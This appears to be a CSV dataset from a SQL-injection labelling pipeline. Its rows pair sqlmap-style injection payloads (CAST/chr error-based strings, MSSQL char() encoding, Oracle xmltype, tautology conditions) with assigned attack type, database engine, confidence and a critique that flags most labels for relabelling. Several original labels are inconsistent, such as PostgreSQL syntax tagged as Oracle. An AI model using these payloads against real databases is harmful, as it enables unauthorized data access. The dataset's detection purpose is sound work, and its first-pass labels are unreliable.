payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"select * from users WHERE username = ""1 ) ) and username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1 ) ) and username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-1190\' and username = ""-8860 )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-1190\' and username = ""-8860 )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' ) ) and ( ( \'guxv\' = \'guxv""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) ) or username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1\' ) ) ) or username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" and username = ""-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-2733\' ) ) ) and username = ""-9668\' ) ) as orfu where 5822 = 5822 and username = ""-2679\' ) ) ) and ( ( ( \'cutk\' like \'cutk""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-2733\' ) ) ) and username = ""-9668\' ) ) as orfu where 5822 = 5822 and username = ""-2679\' ) ) ) and ( ( ( \'cutk\' like \'cutk",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-9987 ) ) ) or ( ( ( 2114 = 2114"" or username = ""1\' )",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""-9987 ) ) ) or ( ( ( 2114 = 2114"" or username = ""1\' )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" or username = ""-1344 ) as gqgi where 2545 = 2545",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" or username = ""-1344 ) as gqgi where 2545 = 2545",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-7199\' or \'qibr\' = \'qibr"" and ( ( ( \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-7199\' or \'qibr\' = \'qibr"" and ( ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798 or username = ""-7199\' or \'qibr\' = \'qibr""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-9564 or username = ""-9263\' ) as qodg where 6798 = 6798 or username = ""-7199\' or \'qibr\' = \'qibr",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 and username = ""-5863"" or username = ""1 ) ) and ( ( 6659 = 6659""",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"1 and username = ""-5863"" or username = ""1 ) ) and ( ( 6659 = 6659",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""1\' or username = ""1 ) and username = ""1\'|| ( select \'vasx\' where 4770 = 4770",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' or username = ""1 ) and username = ""1\'|| ( select \'vasx\' where 4770 = 4770",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 ) or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""-4322\' ) ) as magw where 1627 = 1627",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1 ) or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""-4322\' ) ) as magw where 1627 = 1627",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' ) and ( \'ulkq\' = \'ulkq""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1 ) ) ) and ( ( ( 5368 = 5368""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1\' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1 ) ) ) and ( ( ( 5368 = 5368",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 and username = ""-4108\' ) and ( \'tqjx\' = \'tqjx"" or username = ""-1254""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1\'+ ( select oljg where 2006 = 2006 and username = ""-4108\' ) and ( \'tqjx\' = \'tqjx"" or username = ""-1254",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-9742 ) where 8409 = 8409 or username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-9742 ) where 8409 = 8409 or username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-2783%\' ) ) and ( ( \'%\' = \'"" and username = ""-5880\' ) ) and ( ( \'rwgl\' = \'rwgl""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,-5880\' ) ) and ( ( \'rwgl\' = \'rwgl,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""1 and ( \'ulkq\' = \'ulkq"" or username = ""1\' ) )",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""1 and ( \'ulkq\' = \'ulkq"" or username = ""1\' ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" and username = ""-1641\' ) ) or username = ""-2756\' where 6156 = 6156",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" and username = ""-1641\' ) ) or username = ""-2756\' where 6156 = 6156",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""-8021\' ) ) and ( ( ( \'btjx\' = \'btjx"" or username = ""1",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""-8021\' ) ) and ( ( ( \'btjx\' = \'btjx"" or username = ""1",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1 ) and ( ( 8254 = 8254""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1 ) and ( ( 8254 = 8254",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\' ) ) and ( ( \'cbwx\' = \'cbwx""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\' ) ) and ( ( \'cbwx\' = \'cbwx",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 or username = ""1\' and username = ""-1549\' ) and ( ( 5616 = 5616""",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"1 or username = ""1\' and username = ""-1549\' ) and ( ( 5616 = 5616",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""1\' ) ) ) and username = ""1"" and ( ( ( \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1\' ) ) ) and username = ""1"" and ( ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""1%"" and ""%"" = """" or username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1%"" and ""%"" = """" or username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) and ( ( \'esal\' = \'esal"" or username = ""-2348 ) as sige where 1639 = 1639",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) and ( ( \'esal\' = \'esal"" or username = ""-2348 ) as sige where 1639 = 1639",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-1254"" and username = ""-7199\' and username = ""-8828%\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-7199\' and username = ""-8828%\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'%\' = \'",True,1,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""-5880\' ) ) and ( ( \'rwgl\' = \'rwgl"" or username = ""1%\'",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-5880\' ) ) and ( ( \'rwgl\' = \'rwgl"" or username = ""1%\'",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1%\' ) ) ) or username = ""-1254"" or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1%\' ) ) ) or username = ""-1254"" or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1"" or username = ""-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
